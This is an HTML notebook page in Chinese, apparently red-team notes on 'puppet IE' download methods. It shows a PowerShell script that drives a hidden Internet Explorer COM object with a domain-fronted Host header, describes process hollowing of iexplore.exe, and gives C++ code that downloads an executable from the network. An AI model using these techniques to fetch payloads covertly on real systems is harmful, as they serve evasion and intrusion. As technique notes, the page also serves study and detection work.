<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>傀儡ie</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>傀儡ie</h1><br/>1、通过COM对象InternetExplorer.Application实现文件下载，后台进程为iexplore.exe<br /><br />powershell代码如下：<br /><div class="codebox"><div class="codebox">$ie_com&nbsp;=&nbsp;New-Object&nbsp;-ComObject&nbsp;InternetExplorer.Application<br />$ie_com.Silent&nbsp;=&nbsp;$True<br />$ie_com.Visible&nbsp;=&nbsp;$False<br />$Headers&nbsp;=&nbsp;&quot;Host:&nbsp;&lt;SNIP&gt;.cloudfront.net`r`n&quot;<br />$ie_com.Navigate2(&quot;http://192.168.62.131/index.html&quot;,&nbsp;14,&nbsp;0,&nbsp;$Null,&nbsp;$Headers)<br />while($ie_com.busy&nbsp;-eq&nbsp;$true)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;Start-Sleep&nbsp;-Milliseconds&nbsp;100<br />}<br />$html&nbsp;=&nbsp;$ie_com.document.GetType().InvokeMember(&#39;body&#39;,&nbsp;[System.Reflection.BindingFlags]::GetProperty,&nbsp;$Null,&nbsp;$ie_com.document,&nbsp;$Null).InnerHtml<br />$html<br />$ie_com.Quit();</div></div><br /><br />若IE从未运行过，执行以上代码会弹框提示<br />powershell代码引用自<br /><a href="https://gist.github.com/leoloobeek/f468d34e81795239a8f8bac03646cf59">https://gist.github.com/leoloobeek/f468d34e81795239a8f8bac03646cf59</a><br />，该页面还包含cs、js和vbs的实现方法<br /><br /><br />2、Process Hollowing<br /><br />创建傀儡进程iexplore.exe，传入参数CREATE_SUSPENDED使进程挂起，清空iexplore.exe进程的内存数据，<br />申请新的内存，写入payload，恢复寄存器环境，执行文件下载<br />通过c++实现的文件下载代码如下：<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;windows.h&gt;<br />#include&nbsp;&lt;wininet.h&gt;<br />#define&nbsp;MAXBLOCKSIZE&nbsp;1024<br />#pragma&nbsp;comment(&nbsp;lib,&nbsp;&quot;wininet.lib&quot;&nbsp;)&nbsp;;<br />void&nbsp;download(const&nbsp;char&nbsp;*Url,const&nbsp;char&nbsp;*save_as)<br />{<br />&nbsp;&nbsp;byte&nbsp;Temp[MAXBLOCKSIZE];<br />&nbsp;&nbsp;ULONG&nbsp;Number&nbsp;=&nbsp;1;<br /><br />&nbsp;&nbsp;FILE&nbsp;*stream;<br />&nbsp;&nbsp;HINTERNET&nbsp;hSession&nbsp;=&nbsp;InternetOpen((LPCSTR)&quot;RookIE/1.0&quot;,&nbsp;INTERNET_OPEN_TYPE_PRECONFIG,&nbsp;NULL,&nbsp;NULL,&nbsp;0);<br />&nbsp;&nbsp;if&nbsp;(hSession&nbsp;!=&nbsp;NULL)<br />&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;HINTERNET&nbsp;handle2&nbsp;=&nbsp;InternetOpenUrl(hSession,&nbsp;(LPCSTR)Url,&nbsp;NULL,&nbsp;0,&nbsp;INTERNET_FLAG_DONT_CACHE,&nbsp;0);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(handle2&nbsp;!=&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fopen_s(&amp;stream,&nbsp;save_as,&nbsp;&quot;wb&quot;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(Number&nbsp;&gt;&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetReadFile(handle2,&nbsp;Temp,&nbsp;MAXBLOCKSIZE&nbsp;-&nbsp;1,&nbsp;&amp;Number);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite(Temp,&nbsp;sizeof&nbsp;(char),&nbsp;Number&nbsp;,&nbsp;stream);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(&nbsp;stream&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(handle2);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;handle2&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hSession);<br />&nbsp;&nbsp;&nbsp;&nbsp;hSession&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;}<br />}<br />int&nbsp;main(int&nbsp;argc,&nbsp;char*&nbsp;argv[])<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;download(&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;,&quot;c:\\test\\putty.exe&quot;);<br />&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />下载进程为Internet Explorer<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>